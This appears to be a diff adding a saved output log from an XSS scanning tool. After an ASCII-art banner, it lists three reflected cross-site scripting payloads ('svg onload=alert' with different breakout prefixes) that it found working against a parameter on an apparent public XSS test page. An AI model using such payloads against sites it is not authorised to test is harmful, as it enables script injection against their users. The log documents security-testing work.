@@ -1,0 +1,37 @@
+
+
+  ██████  ▄▄▄       ▄▄▄▄    ▄▄▄       ▒█████  ▄▄▄█████▓ ██░ ██
+▒██    ▒ ▒████▄    ▓█████▄ ▒████▄    ▒██▒  ██▒▓  ██▒ ▓▒▓██░ ██▒
+░ ▓██▄   ▒██  ▀█▄  ▒██▒ ▄██▒██  ▀█▄  ▒██░  ██▒▒ ▓██░ ▒░▒██▀▀██░
+  ▒   ██▒░██▄▄▄▄██ ▒██░█▀  ░██▄▄▄▄██ ▒██   ██░░ ▓██▓ ░ ░▓█ ░██
+▒██████▒▒ ▓█   ▓██▒░▓█  ▀█▓ ▓█   ▓██▒░ ████▓▒░  ▒██▒ ░ ░▓█▒░██▓
+▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░▒▓███▀▒ ▒▒   ▓▒█░░ ▒░▒░▒░   ▒ ░░    ▒ ░░▒░▒
+░ ░▒  ░ ░  ▒   ▒▒ ░▒░▒   ░   ▒   ▒▒ ░  ░ ▒ ▒░     ░     ▒ ░▒░ ░
+░  ░  ░    ░   ▒    ░    ░   ░   ▒   ░ ░ ░ ▒    ░       ░  ░░ ░
+      ░        ░  ░ ░            ░  ░    ░ ░            ░  ░  ░
+                         ░
+
+
+Doing pre-check of http://brutelogic.com.br/xss.php?a=
+Page is reachable! Doing next pre-check...
+Http status code 200, we're good to go!
+
+
+Parameter used: a
+Found xss in payload http://brutelogic.com.br/xss.php?a=/"><svg onload=alert(34305489723146875555666)>
+Time elapsed for test: 0.38568758964538574 seconds
+XSS Type: Simple htmli
+
+
+Found xss in payload http://brutelogic.com.br/xss.php?a=<svg onload=alert(34305489723146875555666)>
+Time elapsed for test: 0.563671350479126 seconds
+XSS Type: inline htmli
+
+
+Found xss in payload http://brutelogic.com.br/xss.php?a="><svg onload=alert(34305489723146875555666)>
+Time elapsed for test: 0.5694706439971924 seconds
+XSS Type: inblock htmli
+
+
+Number of xss found: 3
+Total time elapsed: 3.8844356536865234 seconds
